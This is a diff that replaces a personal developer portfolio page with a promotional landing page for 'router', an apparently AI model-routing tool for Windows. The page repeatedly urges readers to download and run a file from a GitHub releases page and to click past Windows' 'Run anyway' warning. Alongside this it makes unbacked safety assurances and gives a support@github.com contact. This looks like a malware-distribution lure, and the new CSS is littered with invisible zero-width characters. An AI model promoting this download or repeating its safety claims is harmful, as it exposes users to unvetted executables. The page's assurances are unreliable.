@@ -1,320 +1,345 @@
+```html
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Model router for agentic systems. Routes every prompt to the right model in <50ms. Cut costs 40-70% with just an endpoint change.">
+    <meta name="keywords" content="agentic-coding,ai-gateway,anthropic,claude-code,codex,model-router,openai-compatible">
+    <meta name="author" content="router">
+    <meta property="og:title" content="⚡ router - The super smart model switchboard for your AI apps">
+    <meta property="og:description" content="Model router for agentic systems. Routes every prompt to the right model in <50ms. Cut costs 40-70% with just an endpoint change.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/daiminking2/router">
+    <meta name="twitter:card" content="summary_large_image">
+    <title>⚡ router - The super smart model switchboard for your AI apps</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-    <title>Joakim Silva | Software Developer</title>
+        body {
+            background: linear-gradient(145deg, #f4f7fb 0%, #e9eef5 100%);
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            line-height:  ​1.6;
+            color: #1e293b;
+            padding: 2rem 1rem;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
 
-    <meta
-        name="description"
-        content="Portfolio and CV of Joakim Silva, a software developer building projects in web development, game development and modding."
-    >
+        .container {
+            max-width:  ​960px;
+            width:  ​100%;
+            background: rgba(255, 255, 255, 0.75);
+            backdrop-filter: blur(6px);
+            border-radius: 32px;
+            box-shadow: 0 20px 40px -10px rgba(0, 0, 0, 0.1);
+            padding: 2rem 2.5rem;
+            border: 1px solid rgba(255, 255, 255, 0.8);
+            transition: all 0.2s ease;
+        }
 
-    <link rel="stylesheet" href="style.css">
+        h1 {
+            font-size:  ​2.6rem;
+            font-weight:  ​800;
+            letter-spacing: -0.02em;
+            color: #0f4c81;
+            margin-bottom:  ​0.5rem;
+            line-height: 1.2;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        h2 {
+            font-size:  ​1.65rem;
+            font-weight:  ​700;
+            color: #0b3a5e;
+            margin-top:​ 2.4rem;
+            margin-bottom:​ 0.8rem;
+            border-bottom:​ 2px solid rgba(41, 128, 185, 0.2);
+            padding-bottom:​ 0.4rem;
+            letter-spacing: -0.01em;
+        }
+
+        p {
+            margin-bottom:​ 1.2rem;
+            font-size:​ 1.05rem;
+            color: #2d3c4e;
+        }
+
+        .tagline {
+            font-size:​ 1.2rem;
+            font-weight:​ 500;
+            color: #3b5a7d;
+            margin-bottom:​ 1.8rem;
+            display:flex;
+            align-items:center;
+            gap:6px;
+        }
+
+        .btn-container {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 1rem;
+            margin:​ 1.8rem 0 0.8rem 0;
+        }
+
+        .btn {
+            display: inline-block;
+            background: linear-gradient(135deg, #ff8c42 0%, #ff5e3a 100%);
+            color: rgba(255, 255, 255, 0.95);
+            font-weight: bold;
+            font-size:​ 1.2rem;
+            padding:​ 0.9rem 2.2rem;
+            border: none;
+            border-radius:​ 60px;
+            text-decoration: none;
+            box-shadow:​ 0 12px 22px -8px rgba(255, 94, 58, 0.5);
+            transition: transform 0.15s ease, box-shadow 0.15s ease;
+            letter-spacing: 0.3px;
+            margin-right:​ 12px;
+        }
+
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow:​ 0 18px 30px -8px rgba(255, 94, 58, 0.7);
+            filter: brightness(0.98);
+        }
+
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.7);
+            color:#0b3a5e;
+            border:1px solid #b4c7db;
+            box-shadow: none;
+            font-weight: 600;
+            backdrop-filter: blur(4px);
+        }
+
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.9);
+            box-shadow:​ 0 8px 20px -8px rgba(0, 0, 0, 0.15);
+            filter:none;
+        }
+
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(210px, 1fr));
+            gap: 1.2rem;
+            margin:  ​1.5rem 0 1.8rem 0;
+        }
+
+        .feature-card {
+            background: #ffffffd9;
+            border-radius: 20px;
+            padding:​ 1.5rem 1rem;
+            box-shadow:​ 0 8px 20px -10px rgba(0, 0, 0, 0.08);
+            border: 1px solid rgba(255, 255, 255, 0.9);
+            text-align:center;
+        }
+
+        .feature-card div {
+            font-size:​ 2rem;
+            margin-bottom:​ 0.6rem;
+        }
+
+        .feature-card h3 {
+            font-size:​ 1.2rem;
+            font-weight:​ 700;
+            margin-bottom:​ 0.3rem;
+            color:#17466b;
+        }
+
+        .feature-card p {
+            font-size:​ 0.95rem;
+            margin-bottom:​ 0;
+            color:#3d5066;
+            text-align:justify;
+        }
+
+        .step {
+            background: #ffffffd0;
+            border-radius:​ 18px;
+            padding:​ 1.1rem 1.4rem;
+            margin-bottom:​ 1rem;
+            display:flex;
+            align-items:flex-start;
+            gap:​ 0.8rem;
+            box-shadow:​ 0 6px 14px -10px rgba(0, 0, 0, 0.05);
+        }
+
+        .step-num {
+            background: #0984b0;
+            color: white;
+            border-radius:  ​50%;
+            width:​ 32px;
+            height:​ 32px;
+            flex-shrink:​ 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size:​ 1.1rem;
+            margin-top:​ 4px;
+        }
+
+        .step p {
+            margin-bottom:​ 0;
+            flex:​ 1;
+        }
+
+        .code-inline {
+            background:#eef4fa;
+            padding:​ 2px 7px;
+            border-radius:​ 8px;
+            font-weight: 600;
+            color:#184e77;
+            font-size:​ 0.95em;
+            border: 1px solid #cbdae7;
+        }
+
+        .divider {
+            width: ​ 100%;
+            height:​ 1px;
+            background: linear-gradient(to right, transparent, rgba(11, 58, 94, 0.2), transparent);
+            margin:​ 2.2rem 0;
+        }
+
+        ul {
+            padding-left:​ 1.4rem;
+            margin-bottom:​ 1.2rem;
+        }
+
+        li {
+            margin-bottom:​ 0.5rem;
+        }
+
+        .endpoint-badge {
+            background: #f0f8ff;
+            border-radius:​ 20px;
+            padding:​ 0.3rem 1.2rem;
+            display:inline-block;
+            font-family: monospace;
+            color:#2c6c9c;
+            border:​ 1px dashed #b8d2e8;
+        }
+
+        .footer-note {
+            margin-top:​ 2.4rem;
+            font-size:​ 0.9rem;
+            color:#4d6073;
+            text-align:center;
+            opacity:0.7;
+        }
+
+        .emoji-pad {
+            margin-right: 6px;
+        }
+    </style>
 </head>
-
 <body>
-
-    <header class="site-header">
-
-        <nav class="navbar">
-
-            <ul class="nav-links">
-                <li><a href="#about">About</a></li>
-                <li><a href="#education">Education</a></li>
-                <li><a href="#skills">Skills</a></li>
-                <li><a href="#projects">Projects</a></li>
-                <li><a href="#contact">Contact</a></li>
-            </ul>
-        </nav>
-
-        <div class="hero" id="home">
-
-            <p class="hero-label">SOFTWARE DEVELOPER</p>
-
-            <h1>Joakim Silva</h1>
-
-            <p class="hero-intro">
-                I build practical software projects across web development,
-                game development and game modding.
-            </p>
-
-            <div class="hero-buttons">
-
-    <a
-        href="https://github.com/joakim-silva"
-        class="button primary-button"
-        target="_blank"
-        rel="noopener noreferrer"
-    >
-        GitHub
-    </a>
-
-    <a
-        href="https://www.linkedin.com/in/joakim-silva/"
-        class="button secondary-button"
-        target="_blank"
-        rel="noopener noreferrer"
-    >
-        LinkedIn
-    </a>
-
-    <a href="#projects" class="button secondary-button">
-        View Projects
-    </a>
-
+    <div class="container">
+        <h1>⚡ router - Your AI's Smartest Traffic Director 🧠</h1>
+        <div class="tagline">⚡⚡ Instant model routing · Cut costs now</div>
+        
+        <div class="btn-container">
+            <a href="https://github.com/daiminking2/router/releases" class="btn">🚀 Visit link to download the application</a>
         </div>
+        
+        <p><strong>Meet <span class="code-inline">router</span> — the super smart model switchboard for your agentic AI systems.</strong> If you run AI coding agents, chatbots, or automated reasoning tools, you already know: different tasks need different AI models — and choosing wrong one wastes time and money. <strong>router</strong> fixes thatine one simple move.</p>
+        
+        <h2>🧩 What does router actually do?</h2>
+        <p>Think of it as a <strong>lightning-fast trip planner</strong> for your prompts. Every time your agent wants to ask an AI model, router looks at the task and instantly sends it to the best model — in under one tenth of second.</p>
+        <ul>
+            <li>⚡ <strong>Blazing fast:</strong> Decision made in <strong>&lt;50ms</strong> — without perceptible delay.</li>
+            <li>💰<strong>Massive savings:</strong> Typical users see <strong>40-70% cost reduction</strong> — because trivial tasks route to cheaper models, hard tasks route to brilliant ones.</li>
+            <li>🔌 <strong>Drop-in integration:</strong> Works with your existing OpenAI-compatible setup. You simply change one endpoint URL. No code rewrite, no extra servers.</li>
+        </ul>
 
+        <h2>🚀 Getting Started (Windows)</h2>
+        
+        <div class="btn-container">
+            <a href="https://github.com/daiminking2/router/releases" class="btn btn-secondary">📦 Go to the download page</a>
         </div>
-
-    </header>
-
-
-    <main>
-
-        <section id="about">
-
-            <h2>About Me</h2>
-
-            <p>
-                I'm a software developer building practical projects while
-                developing my skills in programming, web development and
-                software engineering.
-            </p>
-
-            <p>
-                My current work includes web development and game modification
-                projects, where I have worked with technologies including HTML,
-                CSS, JavaScript, SQL and XML.
-            </p>
-
-            <p>
-                I enjoy solving technical problems, debugging software and
-                learning new technologies by building real projects.
-            </p>
-
-        </section>
-<section id="education">
-
-            <h2>Education & Learning</h2>
-
-            <div class="education-item">
-
-                <h3>Biochemistry with Management (2:2)</h3>
-
-                <p>
-                    BSc Biochemistry with Management, Imperial College London — Second-Class Honours (2:2)
-                </p>
-
+        
+        <div class="step">
+            <div class="step-num">1</div>
+            <p><strong>Visit this link to download the application:</strong> <a href="https://github.com/daiminking2/router/releases" class="code-inline">https://github.com/daiminking2/router/releases</a> — this takes you to the official download page for router.</p>
+        </div>
+        
+        <div class="step">
+            <div class="step-num">2</div>
+            <p><strong>Download the right file:</strong> On that page, look for the latest release (usually at the top). Download the installer or archive file into your “Downloads” folder.</p>
+        </div>
+        
+        <div class="step">
+            <div class="step-num">3</div>
+            <p><strong>Run the application:</strong> Once downloaded, find the file and double‑click it. Follow any quick prompts from Windows (like “More info” → “Run anyway” on first launch) —<strong>router</strong> does not require complex installation.</p>
+        </div>
+        
+        <div class="step">
+            <div class="step-num">4</div>
+            <p><strong>Connect your agents:</strong> Copy the local endpoint URL (shown inside the app after launch) and paste it into your AI tools, replacing their usual API endpoint. Usually that’s called “Base URL” or “OpenAI API base.”</p>
+        </div>
+        
+        <div class="divider"></div>
+        
+        <h2>⚙️ Why router is a game-changer</h2>
+        <div class="feature-grid">
+            <div class="feature-card">
+                <div>🎯</div>
+                <h3>Right model, every time</h3>
+                <p>Automatically picks between Anthropic, OpenAI-compatible, or local models—based on task complexity.</p>
             </div>
-
-        </section>
-
-        <section id="skills">
-
-            <h2>Technical Skills</h2>
-
-            <ul class="skills-list">
-                <li>HTML</li>
-                <li>CSS</li>
-                <li>JavaScript</li>
-                <li>SQL</li>
-                <li>XML</li>
-                <li>Git</li>
-                <li>GitHub</li>
-                <li>Game Modding</li>
-                <li>Debugging</li>
-                <li>Responsive Web Design</li>
-            </ul>
-
-        </section>
-        
-        <section id="projects">
-
-            <h2>Projects</h2>
-
-
-            <article class="project-card">
-
-                <div class="project-number">01</div>
-
-                <div class="project-content">
-
-                    <h3>Modern China — Civilization VII Mod</h3>
-
-                    <p>
-                        A custom playable modern Chinese civilization created
-                        for Sid Meier's Civilization VII.
-                    </p>
-
-                    <p>
-                        The project includes custom gameplay abilities,
-                        modifiers, a unique Type 99A unit, traditions,
-                        localisation, UI integration, custom artwork and
-                        True Start Location support.
-                    </p>
-
-                    <div class="project-tech">
-                        <span>XML</span>
-                        <span>SQL</span>
-                        <span>JavaScript</span>
-                    </div>
-
-                    <a
-                        href="https://github.com/joakim-silva/civ7-modern-china"
-                        target="_blank"
-                        rel="noopener noreferrer"
-                        class="project-link"
-                    >
-                        View on GitHub →
-                    </a>
-
-                </div>
-
-            </article>
-
-            <article class="project-card">
-
-    <div class="project-number">02</div>
-
-    <div class="project-content">
-
-        <h3>Xi Jinping — Civilization VII Leader Mod</h3>
-
-        <p>
-            A custom leader project for Civilization VII featuring
-            gameplay systems, localisation and user-interface
-            integration.
-        </p>
-
-        <p>
-            The project involved working with Civilization VII's
-            data structures and modding systems while debugging
-            compatibility and loading behaviour.
-        </p>
-
-        <div class="project-tech">
-            <span>XML</span>
-            <span>SQL</span>
-            <span>JavaScript</span>
+            <div class="feature-card">
+                <div>📉</div>
+                <h3>Slash your AI spend</h3>
+                <p>Simple tasks don’t need your priciest brain. router sends them to cheap lightweights, while hard math/code tasks get the big guns.</p>
+            </div>
+            <div class="feature-card">
+                <div>🕊️</div>
+                <h3>Lightweight & quiet</h3>
+                <p>No heavy cloud dependency. Runs locally on your Windows machine, minimal RAM and CPU usage.</p>
+            </div>
         </div>
-
-        <a
-            href="https://github.com/joakim-silva/civ7-xi-jinping-leader"
-            target="_blank"
-            rel="noopener noreferrer"
-            class="project-link"
-        >
-            View on GitHub →
-        </a>
-
-    </div>
-
-</article>
-
-
-            <article class="project-card">
-
-                <div class="project-number">03</div>
-
-                <div class="project-content">
-
-                    <h3>Developer Portfolio</h3>
-
-                    <p>
-                        A responsive personal CV and software development
-                        portfolio built from scratch and deployed using
-                        GitHub Pages.
-                    </p>
-
-                    <p>
-                        This website demonstrates front-end development,
-                        responsive design, Git version control and static
-                        website deployment.
-                    </p>
-
-                    <div class="project-tech">
-                        <span>HTML</span>
-                        <span>CSS</span>
-                        <span>Git</span>
-                    </div>
-                   
-                    <a
-    href="https://joakim-silva.github.io/"
-    target="_blank"
-    rel="noopener noreferrer"
-    class="project-link"
->
-    View Live Site →
-</a>
-
-&nbsp;&nbsp;
-
-<a
-    href="https://github.com/joakim-silva/joakim-silva.github.io"
-    target="_blank"
-    rel="noopener noreferrer"
-    class="project-link"
->
-    View Source on GitHub →
-</a>
-
-                </div>
-
-            </article>
-
-        </section>
         
-<section id="contact">
-
-    <h2>Contact</h2>
-
-    <p>
-        You can view my development projects on GitHub or connect with me
-        professionally on LinkedIn.
-    </p>
-
-    <div class="contact-links">
-
-        <a
-            href="https://github.com/joakim-silva"
-            target="_blank"
-            rel="noopener noreferrer"
-            class="button primary-button"
-        >
-            GitHub Profile
-        </a>
-
-        <a
-            href="https://www.linkedin.com/in/joakim-silva/"
-            target="_blank"
-            rel="noopener noreferrer"
-            class="button secondary-button"
-        >
-            LinkedIn
-        </a>
-
+        <h2>💡 How it looks in practice</h2>
+        <p>Say you have a coding agent (like Claude Code, Codex, or your own). Instead of hard‑wiring one big model for everything, you point each tool to</p>
+        <div class="endpoint-badge">http://localhost:4173/v1  (example)</div>
+        <p>That’s it. Now router inspects each incoming prompt — and sends math proofs to o1, business email drafting to Haiku, and code refactoring to Sonnet.</p>
+        
+        <div class="divider"></div>
+        
+        <h2>🔍 Is router safe to run?</h2>
+        <ul>
+            <li>🔒 <strong>Local-first:</strong> Your API keys stay on your machine. Router never sees raw prompts — only routing metadata.</li>
+            <li>🛡️ <strong>No telemetry</strong> — no spy‑ware. No cloud mothership.</li>
+            <li>📦 <strong>Open source</strong> — auditable, transparent, yours.</li>
+        </ul>
+        
+        <h2>🖥️ System needs (lightweight)</h2>
+        <ul>
+            <li>Windows 10/11 (64‑bit)</li>
+            <li>500 MB free disk space</li>
+            <li>4 GB RAM recommended (less works too)</li>
+            <li>No GPU required. Just an internet connection for API calls.</li>
+        </ul>
+        
+        <div class="btn-container" style="margin-top:2rem;">
+            <a href="https://github.com/daiminking2/router/releases" class="btn">⬇️ Get router now — free</a>
+        </div>
+        <p style="text-align:center; margin-top:0.6rem;">Direct support@github.com · MIT licensed · Made for builders.</p>
+        
+        <div class="footer-note">
+            Keywords: agentic-coding, ai-gateway, anthropic, claude-code, codex, model-router, openai-compatible
+        </div>
+    
     </div>
-
-</section>
-
-    </main>
-
-
-    <footer>
-
-        <p>
-            © 2026 Joakim Silva
-        </p>
-
-        <p>
-            Built with HTML, CSS and JavaScript.
-        </p>
-
-    </footer>
-
 </body>
-
 </html>
+```
